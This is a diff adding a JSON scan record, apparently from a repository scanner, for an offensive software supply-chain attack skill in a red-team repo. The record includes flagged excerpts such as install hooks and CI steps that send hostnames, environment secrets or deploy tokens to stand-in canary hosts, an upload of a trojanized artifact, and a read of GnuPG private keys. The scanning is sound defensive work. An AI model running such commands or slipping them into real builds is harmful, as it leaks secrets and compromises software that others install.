@@ -1,0 +1,363 @@
+{
+  "id": "snailsploit__claude-red__skills~supply-chain~offensive-supply-chain",
+  "owner": "SnailSploit",
+  "repo": "Claude-Red",
+  "path": "Skills/supply-chain/offensive-supply-chain",
+  "name": "offensive-supply-chain",
+  "description": "Comprehensive offensive methodology for software supply chain attacks covering the full kill chain from reconnaissance through exploitation. Addresses dependency confusion across npm, PyPI, and NuGet ecosystems where internal registry override allows an attacker to inject malicious packages that shadow private dependencies. Covers typosquatting techniques for popular packages, compromised package injection via maintainer account takeover or social engineering, and build system attacks through Makefile injection, setup.py install hooks, and npm postinstall scripts. Extends into CI/CD artifact tampering where build outputs are replaced or modified in transit, code signing abuse through stolen or self-signed certificates, upstream repository compromise via commit injection or force-push to trusted repos, and container image supply chain attacks including base image trojaning and registry confusion. Maps to MITRE ATT&CK T1195.001 (Supply Chain Compromise: Compromise Software Dependencies and Development Tools) and T1195.002 (Supply Chain Compromise: Compromise Software Supply Chain). Integrates tooling such as confused for dependency confusion scanning and dependency-check for known vulnerable component detection. Each technique section provides reproducible proof-of-concept patterns, detection guidance for defenders, and engagement-safe execution notes for authorized red team operations.",
+  "stars": 10468,
+  "category": "devops",
+  "commit": "a8de813edc9f66f60d44cfe42d47750e89d9930b",
+  "contentHash": "ef22d9d037e4e713d9661dde313190d4d1d26cb6f954cb4f94944e7cb88713bc",
+  "repoCreatedAt": "2026-03-04T05:52:35Z",
+  "alsoFoundIn": [],
+  "status": "ok",
+  "incomplete": false,
+  "scannedAt": "2026-11-07T16:26:42.053Z",
+  "scan": {
+    "findings": [
+      {
+        "ruleId": "shell",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 47,
+        "excerpt": "cat package-lock.json | jq -r '.dependencies | keys[]' | sort -u > pkg_names.txt",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 51,
+        "excerpt": "status=$(curl -s -o /dev/null -w \"%{http_code}\" \"https://registry.npmjs.org/$pkg\")",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "registry.npmjs.org"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 64,
+        "excerpt": "\"preinstall\": \"curl https://your-canary.oastify.com/npm-$(hostname)-$(whoami)\"",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "your-canary.oastify.com"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 77,
+        "excerpt": "grep -v '^#' requirements.txt | grep -v '^\\s*$' | \\",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 82,
+        "excerpt": "status=$(curl -s -o /dev/null -w \"%{http_code}\" \"https://pypi.org/pypi/$pkg/json\")",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "pypi.org"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 93,
+        "excerpt": "import os, socket, urllib.request",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 100,
+        "excerpt": "urllib.request.urlopen(",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 128,
+        "excerpt": "curl -s \"https://api.nuget.org/v3-flatcontainer/corp.internal.auth/index.json\" \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "api.nuget.org"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 128,
+        "excerpt": "curl -s \"https://api.nuget.org/v3-flatcontainer/corp.internal.auth/index.json\" \\",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 137,
+        "excerpt": "go install github.com/visma-prodsec/confused@latest",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 137,
+        "excerpt": "go install github.com/visma-prodsec/confused@latest",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 159,
+        "excerpt": "target=\"requests\"",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 173,
+        "excerpt": "import urllib.request, socket",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 179,
+        "excerpt": "urllib.request.urlopen(f\"https://canary.example.com/typo-{h}\")",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "canary.example.com"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 218,
+        "excerpt": "@curl -s https://canary.example.com/make-$$(hostname) > /dev/null 2>&1",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "canary.example.com"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 234,
+        "excerpt": "import urllib.request, socket",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 235,
+        "excerpt": "urllib.request.urlopen(",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 293,
+        "excerpt": "const req = https.request({",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 330,
+        "excerpt": "curl -s -d \"token=${{ secrets.DEPLOY_TOKEN }}\" \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 339,
+        "excerpt": "aws s3 cp trojanized-app.tar.gz s3://build-artifacts/releases/app-latest.tar.gz",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 342,
+        "excerpt": "curl -s https://releases.example.com/app-latest.tar.gz.sha256",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "releases.example.com"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 350,
+        "excerpt": "env | grep -iE '(token|secret|key|pass|api)' | \\",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 352,
+        "excerpt": "curl -s \"https://canary.example.com/ci-env?$(echo $line | base64 -w0)\"",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "canary.example.com"
+        ]
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 370,
+        "excerpt": "RUN apt-get update && apt-get install -y curl && \\",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 371,
+        "excerpt": "echo '#!/bin/bash' > /usr/local/bin/entrypoint-hook.sh && \\",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 372,
+        "excerpt": "echo 'curl -s https://canary.example.com/container-$(hostname) &' >> /usr/local/bin/entrypoint-hook.sh && \\",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 372,
+        "excerpt": "echo 'curl -s https://canary.example.com/container-$(hostname) &' >> /usr/local/bin/entrypoint-hook.sh && \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "canary.example.com"
+        ]
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 373,
+        "excerpt": "echo 'exec \"$@\"' >> /usr/local/bin/entrypoint-hook.sh && \\",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 384,
+        "excerpt": "docker pull myapp/backend  # resolves to docker.io/myapp/backend",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 397,
+        "excerpt": "docker inspect --format='{{index .RepoDigests 0}}' myimage:v1.2",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 411,
+        "excerpt": "openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 \\",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 425,
+        "excerpt": "echo $SIGNING_KEY",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 428,
+        "excerpt": "cat ~/.gnupg/private-keys-v1.d/*",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 442,
+        "excerpt": "npm view lodash maintainers",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 453,
+        "excerpt": "git checkout -b patch-perf-improvement",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/supply-chain/offensive-supply-chain/SKILL.md",
+        "line": 495,
+        "excerpt": "confused -l npm package-lock.json 2>&1 | grep \"could be\"",
+        "disclosed": false,
+        "automatic": false
+      }
+    ],
+    "findingTotals": {
+      "shell": 14,
+      "network": 16,
+      "downloads-code": 2,
+      "writes-outside": 3,
+      "reads-secrets": 1
+    },
+    "score": 45,
+    "band": "high",
+    "rulesVersion": "1.2.0",
+    "filesScanned": 1,
+    "filesSkipped": 0
+  },
+  "history": [
+    {
+      "commit": "a8de813edc9f66f60d44cfe42d47750e89d9930b",
+      "scannedAt": "2026-11-07T16:26:42.053Z",
+      "score": 45,
+      "rulesVersion": "1.2.0"
+    }
+  ]
+}
